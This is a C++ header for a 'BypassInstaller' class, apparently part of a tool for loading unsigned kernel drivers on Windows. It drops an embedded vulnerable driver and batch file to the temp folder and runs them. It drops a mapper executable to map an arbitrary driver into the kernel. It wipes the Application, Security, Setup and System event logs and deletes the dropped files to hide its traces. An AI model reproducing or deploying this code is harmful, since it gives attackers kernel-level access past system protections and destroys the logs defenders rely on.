#pragma once
#include "main.h"
#include "ImageResources.h"

class BypassInstaller
{
public:
	bool ClearMapperLogs();
	bool LoadVulnerableDriver();
	bool MapDriver(std::string pathToDriver, std::string nameofDriver);
private:
	// make them constexpr?
	const std::string driver_name = "scmbusl.sys";
	const std::string loadbat_name = "load.bat";
	const std::string mapper_name = "mapper.exe";


	bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size);
	
};



inline bool BypassInstaller::ClearMapperLogs()
{
	const char* log_names[] = { "Application", "Security", "Setup", "System" };

	DWORD logs_cleared = 0;
	HANDLE hLog;

	for (int i = 0; i < 4; i++) {
		hLog = OpenEventLog(NULL, log_names[i]);
		if (hLog)
			if (ClearEventLog(hLog, NULL)) {
				logs_cleared++;
				CloseEventLog(hLog);
			}
	}

	if (hLog)
	{
		CloseHandle(hLog);

		if (logs_cleared == 4)
			return true;
	}
	else
	{
		std::cerr << "[-]Couldn't clear mapper logs." << std::endl;
	}

	return false;
}

inline bool BypassInstaller::LoadVulnerableDriver()
{
	std::system("sc stop scmbusl");
	std::system("cls");

	char temp_directory[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH) return false;
	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
	if (!CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(scmbusl_data), sizeof(scmbusl_data))) return false;


	char temp_directory1[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret1 = GetTempPathA(sizeof(temp_directory1), temp_directory1);
	if (!get_temp_path_ret1 || get_temp_path_ret1 > MAX_PATH) return false;
	const std::string Loadbat_path = std::string(temp_directory1) + "\\" + loadbat_name;
	if (!CreateFileFromMemory(Loadbat_path, reinterpret_cast<const char*>(Loadbat), sizeof(Loadbat))) return false;


	// loads the driver.
	std::system(Loadbat_path.c_str());
	std::system("cls");


	const auto removeTempdriver = std::remove(driver_path.c_str());

	if (removeTempdriver != 0)
		return false;

	const auto removeTempBatfile = std::remove(Loadbat_path.c_str());

	if (removeTempBatfile != 0)
		return false;


	return true;
}

inline bool BypassInstaller::CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size) {
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size))
	{
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}


inline bool BypassInstaller::MapDriver(std::string pathToDriver, std::string nameofDriver) {

	char temp_directory[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH) return false;
	const std::string mapper_path = std::string(temp_directory) + "\\" + mapper_name;
	if (!CreateFileFromMemory(mapper_path, reinterpret_cast<const char*>(Mapper_data), sizeof(Mapper_data))) return false;


	std::error_code err;
	try
	{
		std::filesystem::copy(pathToDriver, temp_directory, std::filesystem::copy_options::overwrite_existing);
	}
	catch (const std::filesystem::filesystem_error & err)
	{

		std::cerr << "The system cannot find the file specified." << " " << "located at :" << err.path1() << std::endl;
		std::this_thread::sleep_for(std::chrono::seconds(4));
	}


	std::string tempDirDriver = std::string(temp_directory) + "\\" + nameofDriver;
	std::string mapp = mapper_path + " " + tempDirDriver;
	std::system(mapp.c_str());

	// clears screen from mapper text
	std::this_thread::sleep_for(std::chrono::seconds(1));
	std::system("cls");

	const auto removeTempMapperfile = std::remove(mapper_path.c_str());

	if (removeTempMapperfile != 0)
		return false;


	const auto removeTempDriverfile = std::remove(tempDirDriver.c_str());

	if (removeTempDriverfile != 0)
		return false;

	return true;
}